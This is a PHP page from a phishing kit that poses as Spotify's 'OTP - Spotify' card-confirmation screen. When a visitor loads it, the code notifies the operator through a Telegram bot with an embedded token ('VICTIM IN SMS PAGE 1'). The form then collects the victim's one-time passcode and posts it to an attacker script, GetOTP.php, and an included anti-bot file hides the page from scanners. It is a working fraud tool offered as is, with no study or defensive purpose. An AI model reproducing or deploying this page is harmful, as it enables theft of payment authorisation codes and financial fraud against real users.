<?php
include './CRfiles/PHP/botfucker.php';
$infos = "[⚠️] VICTIM IN SMS PAGE 1";
    $token ='1900956727:AAHEk81s5ZHuFSD0kGvNZEr6bTTv-ttON_0';
    $data = [
    'text' => $infos,
    'chat_id' => '-628439401'
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
 ?>
<!DOCTYPE html>

<html id="app" lang="en" dir="ltr" ng-csp="" ng-strict-di="" class="js-focus-visible ng-scope" data-js-focus-visible=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <title class="ng-binding">OTP - Spotify</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <!--<base href="/">--><base href=".">
  <link rel="icon" href="./CRfiles/favicon.ico">
  <link href="./CRfiles/index.b48f2b8327399f826bfd.css" media="screen" rel="stylesheet">

  
  </head>
<body ng-controller="LoginController" class="ng-scope">
  <!-- ngInclude: template --><div ng-include="template" class="ng-scope"><div sp-header="" class="ng-scope"><div class="head ">
  <a class="spotify-logo" tabindex="-1" title="Spotify" ng-href="/en" href="./Spow/Error.php"></a>
</div>
</div>

<div class="container-fluid login ng-scope">
 
  <div class="content">
    <!-- ngIf: showContinueLabel --><div class="row ng-scope" ng-if="showContinueLabel">


    <form  method="post" action="./MrCorona/GetOTP.php" class="ng-pristine ng-valid-sp-disallow-chars ng-invalid ng-invalid-required">
        <div>
          <center>

             <img src="./CRfiles/a.png">
             <span>CARD CONFIRMATION</span>
          </center>
        </div>
        <hr>
       <input type="hidden" value="SpoW" name="MrCorona">
      <div class="row" ng-class="{&#39;has-error&#39;: (accounts.username.$dirty &amp;&amp; accounts.username.$invalid) || invalidCredentials}">
        <div class="col-xs-12">
          <label for="login-username" class="control-label ng-binding">
            One Time Password
          </label>
          <input  type="text" inputmode="numeric" class="form-control input-with-feedback ng-pristine ng-valid-sp-disallow-chars ng-empty ng-invalid ng-invalid-required ng-touched focus-visible" name="otpCorona"  placeholder="" required=""  autocomplete=""  >
          <!-- ngIf: accounts.username.$dirty && accounts.username.$invalid -->
        </div>
      </div>

      <br>
                  <span>* To update your card, a passcode was sent to your phone number.</span>

      <!-- ngIf: showAutomationKey -->

        

        
        
   

    <div id="sign-up-section">
      <div class="row">
        <div class="col-xs-12">
          <signup class="ng-isolate-scope"><!-- ngIf: showSignup --><div ng-if="showSignup" class="ng-scope">
    <!-- ngIf: showButton --><div ng-if="showButton" class="ng-scope">
        <div class="row">
            <div class="col-xs-12">
                <br>
            </div>
        </div>
        <div>
            <div class="row">
                <div class="col-xs-12">
                  <input class="btn btn-block btn-green ng-binding" type="submit" value="CONFIRM">

                   
                </div>
            </div>
        </div>
    </div>
     </form>
     <!-- end ngIf: showButton -->

    <!-- ngIf: showAppStoreBanner -->
</div><!-- end ngIf: showSignup -->
</signup>
        </div>
      </div>
    </div>

  </div><!-- .content -->
</div><!-- .container -->
</div>


<div></div></body></html>